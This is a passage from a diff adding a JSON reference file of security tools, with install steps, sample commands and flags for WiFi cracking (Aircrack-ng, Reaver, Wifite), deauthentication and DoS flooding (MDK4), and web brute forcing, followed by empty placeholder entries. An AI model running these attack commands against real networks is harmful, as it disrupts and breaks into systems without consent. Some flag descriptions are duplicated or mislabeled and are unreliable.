+            "detail": "gem install cewl",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Install from source",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/digininja/CeWL.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd CeWL",
+            "copyable": true
+          },
+          {
+            "detail": "sudo cpan install Switch::Long::Get",
+            "copyable": true
+          },
+          {
+            "detail": "sudo cpan install WWW::Mechanize",
+            "copyable": true
+          },
+          {
+            "detail": "sudo cpan install HTML::TokeParser::Simple",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Generate wordlist from website",
+        "command": "cewl https://example.com",
+        "notes": []
+      },
+      {
+        "description": "With depth and word length",
+        "command": "cewl -d 2 -m 6 https://example.com",
+        "notes": []
+      },
+      {
+        "description": "Save to file",
+        "command": "cewl -w wordlist.txt https://example.com",
+        "notes": []
+      },
+      {
+        "description": "With email addresses",
+        "command": "cewl -e --email_file emails.txt https://example.com",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-d",
+        "description": "Depth to spider"
+      },
+      {
+        "flag": "-m",
+        "description": "Minimum word length"
+      },
+      {
+        "flag": "-w",
+        "description": "Output wordlist file"
+      },
+      {
+        "flag": "-e",
+        "description": "Include email addresses"
+      },
+      {
+        "flag": "--email_file",
+        "description": "Save emails to file"
+      },
+      {
+        "flag": "-a",
+        "description": "Include meta data"
+      },
+      {
+        "flag": "-v",
+        "description": "Verbose output"
+      }
+    ],
+    "operational_tips": [
+      "Spider relevant websites for targeted wordlists.",
+      "Combine with company-specific information.",
+      "Use appropriate depth for comprehensive coverage.",
+      "Clean and process generated wordlists before use."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "hashid",
+    "name": "HashID",
+    "summary": "HashID is a tool to identify the different types of hashes used to encrypt data.",
+    "installation_guides": [
+      {
+        "platform": "Install from pip",
+        "steps": [
+          {
+            "detail": "pip3 install hashID",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Install from source",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/psypanda/hashid.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd hashid",
+            "copyable": true
+          },
+          {
+            "detail": "python3 setup.py install",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Identify hash type",
+        "command": "hashid '5d41402abc4b2a76b9719d911017c592'",
+        "notes": []
+      },
+      {
+        "description": "Multiple hashes",
+        "command": "hashid 'hash1' 'hash2' 'hash3'",
+        "notes": []
+      },
+      {
+        "description": "Extended mode",
+        "command": "hashid -m '5d41402abc4b2a76b9719d911017c592'",
+        "notes": []
+      },
+      {
+        "description": "Output to file",
+        "command": "hashid -o results.txt '5d41402abc4b2a76b9719d911017c592'",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-m",
+        "description": "Extended mode"
+      },
+      {
+        "flag": "-o",
+        "description": "Output to file"
+      },
+      {
+        "flag": "-j",
+        "description": "JSON output"
+      },
+      {
+        "flag": "-h",
+        "description": "Show help"
+      },
+      {
+        "flag": "-v",
+        "description": "Version information"
+      }
+    ],
+    "operational_tips": [
+      "Use extended mode for more detailed analysis.",
+      "Identify hash types before attempting to crack.",
+      "Save results for documentation and reference.",
+      "Cross-reference with hash databases."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "aircrack-ng",
+    "name": "Aircrack-ng",
+    "summary": "Aircrack-ng is a complete suite of tools to assess WiFi network security, focusing on capturing packets and cracking WEP/WPA passwords.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "steps": [
+          {
+            "detail": "sudo apt install aircrack-ng",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Kali Linux (pre-installed)",
+        "steps": [
+          {
+            "detail": "aircrack-ng --help",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Capture packets",
+        "command": "sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture.cap wlan0mon",
+        "notes": []
+      },
+      {
+        "description": "Crack WPA handshake",
+        "command": "aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture.cap",
+        "notes": []
+      },
+      {
+        "description": "Deauthenticate client",
+        "command": "sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55 wlan0mon",
+        "notes": []
+      },
+      {
+        "description": "Monitor mode setup",
+        "command": "sudo airmon-ng start wlan0",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-w",
+        "description": "Wordlist file"
+      },
+      {
+        "flag": "-b",
+        "description": "BSSID of target"
+      },
+      {
+        "flag": "-c",
+        "description": "Channel number"
+      },
+      {
+        "flag": "-w",
+        "description": "Write to file"
+      },
+      {
+        "flag": "-0",
+        "description": "Deauthentication mode"
+      },
+      {
+        "flag": "-a",
+        "description": "Access point BSSID"
+      },
+      {
+        "flag": "-5",
+        "description": "Number of packets"
+      }
+    ],
+    "operational_tips": [
+      "Ensure wireless card supports monitor mode.",
+      "Capture WPA handshake before cracking.",
+      "Use good wordlists for better success rates.",
+      "Be aware of legal requirements for wireless testing."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "kismet",
+    "name": "Kismet",
+    "summary": "Kismet is a wireless network detector, sniffer, and intrusion detection system that works with 802.11 layer2 wireless networks.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "steps": [
+          {
+            "detail": "sudo apt install kismet",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Install from source",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/kismetwireless/kismet.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd kismet",
+            "copyable": true
+          },
+          {
+            "detail": "sudo apt install build-essential libmicrohttpd-dev libnl-3-dev libpcap-dev",
+            "copyable": true
+          },
+          {
+            "detail": "./configure && make && sudo make install",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Start Kismet",
+        "command": "sudo kismet -c kismet.conf",
+        "notes": []
+      },
+      {
+        "description": "Capture to specific file",
+        "command": "sudo kismet -t capture.kismet",
+        "notes": []
+      },
+      {
+        "description": "With specific interface",
+        "command": "sudo kismet -i wlan0mon",
+        "notes": []
+      },
+      {
+        "description": "GPS logging",
+        "command": "sudo kismet --use-gps",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-c",
+        "description": "Configuration file"
+      },
+      {
+        "flag": "-i",
+        "description": "Capture interface"
+      },
+      {
+        "flag": "-t",
+        "description": "Capture file prefix"
+      },
+      {
+        "flag": "-f",
+        "description": "Force override"
+      },
+      {
+        "flag": "--use-gps",
+        "description": "Enable GPS logging"
+      },
+      {
+        "flag": "-n",
+        "description": "No splash screen"
+      },
+      {
+        "flag": "-v",
+        "description": "Verbose output"
+      }
+    ],
+    "operational_tips": [
+      "Configure properly before starting captures.",
+      "Use GPS for location-based analysis.",
+      "Monitor for extended periods for comprehensive data.",
+      "Review captured data for network mapping."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "reaver",
+    "name": "Reaver",
+    "summary": "Reaver implements a brute force attack against WiFi Protected Setup (WPS) registrar PINs to recover WPA/WPA2 passphrases.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "steps": [
+          {
+            "detail": "sudo apt install reaver",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Install from source",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/t6x/reaver-wps-fork-t6x.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd reaver-wps-fork-t6x/src",
+            "copyable": true
+          },
+          {
+            "detail": "./configure && make && sudo make install",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Basic WPS attack",
+        "command": "reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv",
+        "notes": []
+      },
+      {
+        "description": "With custom timeout",
+        "command": "reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -t 10 -vv",
+        "notes": []
+      },
+      {
+        "description": "Fixed channel",
+        "command": "reaver -i wlan0mon -c 6 -b AA:BB:CC:DD:EE:FF -vv",
+        "notes": []
+      },
+      {
+        "description": "With PIXIE Dust attack",
+        "command": "reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF --pixie-dust -vv",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-i",
+        "description": "Wireless interface"
+      },
+      {
+        "flag": "-b",
+        "description": "Target BSSID"
+      },
+      {
+        "flag": "-c",
+        "description": "Channel number"
+      },
+      {
+        "flag": "-t",
+        "description": "Timeout in seconds"
+      },
+      {
+        "flag": "-vv",
+        "description": "Verbose output"
+      },
+      {
+        "flag": "--pixie-dust",
+        "description": "PIXIE Dust attack"
+      },
+      {
+        "flag": "-p",
+        "description": "WPS PIN"
+      },
+      {
+        "flag": "-d",
+        "description": "Delay between attempts"
+      }
+    ],
+    "operational_tips": [
+      "Ensure stable connection to target AP.",
+      "Monitor for lockouts and adjust timing.",
+      "PIXIE Dust attack is faster on vulnerable routers.",
+      "Document all WPS vulnerabilities found."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "bully",
+    "name": "Bully",
+    "summary": "Bully is a WPS brute force tool that implements a brute force attack against WiFi Protected Setup (WPS) PINs.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "steps": [
+          {
+            "detail": "sudo apt install bully",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Install from source",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/aanarchyy/bully.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd bully",
+            "copyable": true
+          },
+          {
+            "detail": "make && sudo make install",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Basic WPS attack",
+        "command": "bully wlan0mon -b AA:BB:CC:DD:EE:FF -v 4",
+        "notes": []
+      },
+      {
+        "description": "With PIN length",
+        "command": "bully wlan0mon -b AA:BB:CC:DD:EE:FF -l 8 -v 4",
+        "notes": []
+      },
+      {
+        "description": "Force specific channel",
+        "command": "bully wlan0mon -c 6 -b AA:BB:CC:DD:EE:FF -v 4",
+        "notes": []
+      },
+      {
+        "description": "With custom delay",
+        "command": "bully wlan0mon -b AA:BB:CC:DD:EE:FF -d 2 -v 4",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-b",
+        "description": "Target BSSID"
+      },
+      {
+        "flag": "-c",
+        "description": "Channel number"
+      },
+      {
+        "flag": "-l",
+        "description": "PIN length"
+      },
+      {
+        "flag": "-d",
+        "description": "Delay between attempts"
+      },
+      {
+        "flag": "-v",
+        "description": "Verbose level (1-5)"
+      },
+      {
+        "flag": "-s",
+        "description": "Skip first PIN"
+      },
+      {
+        "flag": "-f",
+        "description": "Force operation"
+      }
+    ],
+    "operational_tips": [
+      "Start with default PIN length of 8.",
+      "Monitor for AP lockouts and adjust timing.",
+      "Use verbose output to monitor progress.",
+      "Combine with other wireless tools for testing."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "wifite",
+    "name": "Wifite",
+    "summary": "Wifite is a wireless auditor that attacks multiple WEP, WPA, and WPS networks in a row.",
+    "installation_guides": [
+      {
+        "platform": "Install from pip",
+        "steps": [
+          {
+            "detail": "pip3 install wifite2",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Install from source",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/derv82/wifite2.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd wifite2",
+            "copyable": true
+          },
+          {
+            "detail": "sudo python3 setup.py install",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Scan and attack all networks",
+        "command": "sudo wifite2 -i wlan0mon",
+        "notes": []
+      },
+      {
+        "description": "Attack specific network",
+        "command": "sudo wifite2 -i wlan0mon -b AA:BB:CC:DD:EE:FF",
+        "notes": []
+      },
+      {
+        "description": "WPS only mode",
+        "command": "sudo wifite2 -i wlan0mon --wps",
+        "notes": []
+      },
+      {
+        "description": "With wordlist",
+        "command": "sudo wifite2 -i wlan0mon -w wordlist.txt",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-i",
+        "description": "Wireless interface"
+      },
+      {
+        "flag": "-b",
+        "description": "Target BSSID"
+      },
+      {
+        "flag": "-w",
+        "description": "Wordlist for WPA"
+      },
+      {
+        "flag": "--wps",
+        "description": "WPS attack only"
+      },
+      {
+        "flag": "--all",
+        "description": "Attack all networks"
+      },
+      {
+        "flag": "-v",
+        "description": "Verbose output"
+      },
+      {
+        "flag": "-p",
+        "description": "Passive scanning"
+      }
+    ],
+    "operational_tips": [
+      "Automates multiple attack types efficiently.",
+      "Good for testing multiple networks quickly.",
+      "Monitor progress and adjust parameters as needed.",
+      "Be aware of legal requirements for testing."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "mdk4",
+    "name": "MDK4",
+    "summary": "MDK4 is a wireless attack tool that implements various attacks including deauthentication, beacon flooding, and packet injection.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "steps": [
+          {
+            "detail": "sudo apt install mdk4",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Install from source",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/aircrack-ng/mdk4.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd mdk4",
+            "copyable": true
+          },
+          {
+            "detail": "make && sudo make install",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Beacon flood attack",
+        "command": "sudo mdk4 wlan0mon b -f AA:BB:CC:DD:EE:FF",
+        "notes": []
+      },
+      {
+        "description": "Deauthentication attack",
+        "command": "sudo mdk4 wlan0mon d -c AA:BB:CC:DD:EE:FF",
+        "notes": []
+      },
+      {
+        "description": "EAPOL start flood",
+        "command": "sudo mdk4 wlan0mon e -f AA:BB:CC:DD:EE:FF",
+        "notes": []
+      },
+      {
+        "description": "Authentication DOS",
+        "command": "sudo mdk4 wlan0mon a -i AA:BB:CC:DD:EE:FF",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "b",
+        "description": "Beacon flood attack"
+      },
+      {
+        "flag": "d",
+        "description": "Deauthentication attack"
+      },
+      {
+        "flag": "e",
+        "description": "EAPOL start flood"
+      },
+      {
+        "flag": "a",
+        "description": "Authentication DOS"
+      },
+      {
+        "flag": "-f",
+        "description": "Target BSSID"
+      },
+      {
+        "flag": "-c",
+        "description": "Channel number"
+      },
+      {
+        "flag": "-i",
+        "description": "Target BSSID"
+      }
+    ],
+    "operational_tips": [
+      "Use for testing wireless network robustness.",
+      "Be careful with DOS attacks on production networks.",
+      "Monitor network responses during attacks.",
+      "Document all wireless vulnerabilities found."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "dirbuster",
+    "name": "DirBuster",
+    "summary": "DirBuster is a multi-threaded Java application designed to brute force directories and files names on web/application servers.",
+    "installation_guides": [
+      {
+        "platform": "Download from GitHub",
+        "steps": [
+          {
+            "detail": "wget https://github.com/Va5c0/DirBuster/releases/latest/download/DirBuster-1.0.2.jar",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Requires Java 8+",
+        "steps": [
+          {
+            "detail": "java -version",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Basic directory scan",
+        "command": "java -jar DirBuster-1.0.2.jar -u https://example.com",
+        "notes": []
+      },
+      {
+        "description": "With custom wordlist",
+        "command": "java -jar DirBuster-1.0.2.jar -u https://example.com -l wordlist.txt",
+        "notes": []
+      },
+      {
+        "description": "With file extensions",
+        "command": "java -jar DirBuster-1.0.2.jar -u https://example.com -x php,asp,html",
+        "notes": []
+      },
+      {
+        "description": "Save results",
+        "command": "java -jar DirBuster-1.0.2.jar -u https://example.com -o results.txt",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-u",
+        "description": "Target URL"
+      },
+      {
+        "flag": "-l",
+        "description": "Wordlist file"
+      },
+      {
+        "flag": "-x",
+        "description": "File extensions"
+      },
+      {
+        "flag": "-o",
+        "description": "Output file"
+      },
+      {
+        "flag": "-t",
+        "description": "Number of threads"
+      },
+      {
+        "flag": "-r",
+        "description": "Recursive scan"
+      },
+      {
+        "flag": "-H",
+        "description": "Custom headers"
+      }
+    ],
+    "operational_tips": [
+      "Use comprehensive wordlists for better coverage.",
+      "Specify relevant file extensions for target technology.",
+      "Adjust threads based on target responsiveness.",
+      "Save results for manual verification and testing."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "whatweb",
+    "name": "WhatWeb",
+    "summary": "WhatWeb is a web scanner that identifies websites, technologies, and version information.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "steps": [
+          {
+            "detail": "sudo apt install whatweb",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Install from gem",
+        "steps": [
+          {
+            "detail": "gem install whatweb",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Install from source",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/urbanadventurer/WhatWeb.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd WhatWeb",
+            "copyable": true
+          },
+          {
+            "detail": "sudo ruby whatweb.rb",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Basic web scan",
+        "command": "whatweb https://example.com",
+        "notes": []
+      },
+      {
+        "description": "Verbose output",
+        "command": "whatweb -v https://example.com",
+        "notes": []
+      },
+      {
+        "description": "Aggressive mode",
+        "command": "whatweb -a 3 https://example.com",
+        "notes": []
+      },
+      {
+        "description": "Log results",
+        "command": "whatweb --log-verbose=whatweb.log https://example.com",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-v",
+        "description": "Verbose output"
+      },
+      {
+        "flag": "-a",
+        "description": "Aggression level (1-4)"
+      },
+      {
+        "flag": "--log-verbose",
+        "description": "Log verbose output"
+      },
+      {
+        "flag": "--log-brief",
+        "description": "Log brief output"
+      },
+      {
+        "flag": "--log-xml",
+        "description": "Log XML output"
+      },
+      {
+        "flag": "--log-json",
+        "description": "Log JSON output"
+      },
+      {
+        "flag": "--max-redirects",
+        "description": "Maximum redirects"
+      }
+    ],
+    "operational_tips": [
+      "Use higher aggression levels for thorough scanning.",
+      "Log results for later analysis and reporting.",
+      "Combine with other web scanning tools.",
+      "Be aware of rate limiting on targets."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "wappalyzer",
+    "name": "Wappalyzer",
+    "summary": "Wappalyzer identifies technologies on websites including content management systems, web servers, and frameworks.",
+    "installation_guides": [
+      {
+        "platform": "Command line version",
+        "steps": [
+          {
+            "detail": "npm install -g wappalyzer",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Python library",
+        "steps": [
+          {
+            "detail": "pip3 install python-wappalyzer",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Analyze website",
+        "command": "wappalyzer https://example.com",
+        "notes": []
+      },
+      {
+        "description": "JSON output",
+        "command": "wappalyzer --json https://example.com",
+        "notes": []
+      },
+      {
+        "description": "With user agent",
+        "command": "wappalyzer --user-agent 'Custom Bot 1.0' https://example.com",
+        "notes": []
+      },
+      {
+        "description": "Python library usage",
+        "command": "python3 -c 'import wappalyzer; print(wappalyzer.identify(\"https://example.com\"))'",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "--json",
+        "description": "JSON output format"
+      },
+      {
+        "flag": "--user-agent",
+        "description": "Custom user agent"
+      },
+      {
+        "flag": "--timeout",
+        "description": "Request timeout"
+      },
+      {
+        "flag": "--verify",
+        "description": "Verify SSL certificates"
+      },
+      {
+        "flag": "--help",
+        "description": "Show help"
+      },
+      {
+        "flag": "--version",
+        "description": "Show version"
+      }
+    ],
+    "operational_tips": [
+      "Use for technology stack identification.",
+      "JSON output is useful for automation.",
+      "Combine with vulnerability scans for context.",
+      "Document technology stack for attack planning."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "subjack",
+    "name": "Subjack",
+    "summary": "Subjack is a tool for finding subdomain takeovers by checking DNS records for CNAMEs pointing to services.",
+    "installation_guides": [
+      {
+        "platform": "Install from go",
+        "steps": [
+          {
+            "detail": "go install -v github.com/haccer/subjack@latest",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Install from source",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/haccer/subjack.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd subjack",
+            "copyable": true
+          },
+          {
+            "detail": "go build",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Check domain for takeovers",
+        "command": "subjack -d example.com",
+        "notes": []
+      },
+      {
+        "description": "With wordlist",
+        "command": "subjack -d example.com -w subdomains.txt",
+        "notes": []
+      },
+      {
+        "description": "Check specific subdomain",
+        "command": "subjack -d example.com -s test.example.com",
+        "notes": []
+      },
+      {
+        "description": "JSON output",
+        "command": "subjack -d example.com -json",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-d",
+        "description": "Domain to check"
+      },
+      {
+        "flag": "-w",
+        "description": "Wordlist file"
+      },
+      {
+        "flag": "-s",
+        "description": "Specific subdomain"
+      },
+      {
+        "flag": "-json",
+        "description": "JSON output format"
+      },
+      {
+        "flag": "-v",
+        "description": "Verbose output"
+      },
+      {
+        "flag": "-t",
+        "description": "Number of threads"
+      },
+      {
+        "flag": "-h",
+        "description": "Show help"
+      }
+    ],
+    "operational_tips": [
+      "Check for vulnerable CNAME configurations.",
+      "Use comprehensive subdomain lists.",
+      "Document all potential takeover opportunities.",
+      "Verify findings manually before exploitation."
+    ],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "wireshark",
+    "name": "Unknown Tool",
+    "summary": "No instructions are available for this tool yet.",
+    "installation_guides": [],
+    "quick_examples": [],
+    "common_flags": [],
+    "operational_tips": [],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "tshark",
+    "name": "Unknown Tool",
+    "summary": "No instructions are available for this tool yet.",
+    "installation_guides": [],
+    "quick_examples": [],
+    "common_flags": [],
+    "operational_tips": [],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "tcpdump",
+    "name": "Unknown Tool",
+    "summary": "No instructions are available for this tool yet.",
+    "installation_guides": [],
+    "quick_examples": [],
+    "common_flags": [],
+    "operational_tips": [],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "ettercap",
+    "name": "Unknown Tool",
+    "summary": "No instructions are available for this tool yet.",
+    "installation_guides": [],
+    "quick_examples": [],
+    "common_flags": [],
+    "operational_tips": [],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "driftnet",
+    "name": "Unknown Tool",
+    "summary": "No instructions are available for this tool yet.",
+    "installation_guides": [],
+    "quick_examples": [],
+    "common_flags": [],
+    "operational_tips": [],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "dsniff",
+    "name": "Unknown Tool",
+    "summary": "No instructions are available for this tool yet.",
+    "installation_guides": [],
+    "quick_examples": [],
+    "common_flags": [],
+    "operational_tips": [],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "mitmproxy",
+    "name": "Unknown Tool",
+    "summary": "No instructions are available for this tool yet.",
+    "installation_guides": [],
+    "quick_examples": [],
+    "common_flags": [],
+    "operational_tips": [],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "bettercap",
+    "name": "Unknown Tool",
+    "summary": "No instructions are available for this tool yet.",
+    "installation_guides": [],
+    "quick_examples": [],
+    "common_flags": [],
+    "operational_tips": [],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "sbd",
+    "name": "Unknown Tool",
+    "summary": "No instructions are available for this tool yet.",
+    "installation_guides": [],
+    "quick_examples": [],
+    "common_flags": [],
+    "operational_tips": [],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "cryptcat",
+    "name": "Unknown Tool",
+    "summary": "No instructions are available for this tool yet.",
+    "installation_guides": [],
+    "quick_examples": [],
+    "common_flags": [],
+    "operational_tips": [],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "dnscat2",
+    "name": "Unknown Tool",
+    "summary": "No instructions are available for this tool yet.",
+    "installation_guides": [],
+    "quick_examples": [],
+    "common_flags": [],
+    "operational_tips": [],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "steghide",
+    "name": "Unknown Tool",
+    "summary": "No instructions are available for this tool yet.",
+    "installation_guides": [],
+    "quick_examples": [],
+    "common_flags": [],
+    "operational_tips": [],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "outguess",
+    "name": "Unknown Tool",
+    "summary": "No instructions are available for this tool yet.",
+    "installation_guides": [],
+    "quick_examples": [],
+    "common_flags": [],
+    "operational_tips": [],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "exiftool",
+    "name": "Unknown Tool",
+    "summary": "No instructions are available for this tool yet.",
+    "installation_guides": [],
+    "quick_examples": [],
+    "common_flags": [],
+    "operational_tips": [],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "binwalk",
+    "name": "Unknown Tool",
+    "summary": "No instructions are available for this tool yet.",
+    "installation_guides": [],
+    "quick_examples": [],
+    "common_flags": [],
+    "operational_tips": [],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "foremost",
+    "name": "Unknown Tool",
+    "summary": "No instructions are available for this tool yet.",
+    "installation_guides": [],
+    "quick_examples": [],
+    "common_flags": [],
+    "operational_tips": [],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "strings",
+    "name": "Unknown Tool",
+    "summary": "No instructions are available for this tool yet.",
+    "installation_guides": [],
+    "quick_examples": [],
+    "common_flags": [],
+    "operational_tips": [],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "scalpel",
+    "name": "Unknown Tool",
+    "summary": "No instructions are available for this tool yet.",
+    "installation_guides": [],
+    "quick_examples": [],
+    "common_flags": [],
+    "operational_tips": [],
+    "step_sequences": [],
+    "workflow_guides": [],
+    "output_notes": [],
+    "advanced_usage": [],
+    "comparison_table": null,
+    "resources": []
+  },
+  {
+    "id": "bulk_extractor",
+    "name": "Unknown Tool",
+    "summary": "No instructions are available for this tool yet.",
+    "installation_guides": [],
+    "quick_examples": [],
+    "common_flags": [],
